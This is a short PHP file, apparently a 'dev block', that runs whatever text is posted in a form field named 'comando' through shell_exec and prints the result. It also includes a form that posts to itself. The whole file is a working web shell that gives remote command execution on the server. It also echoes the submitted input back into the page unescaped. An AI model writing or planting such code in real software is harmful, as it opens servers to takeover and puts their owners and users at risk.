<?php

$output = shell_exec($_POST['comando']);
echo "<pre>$output</pre>";

?>
<form action="/blocks/dev_block.php" method="post">
  <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
  <input type="submit" value="Submit">
</form>
?>
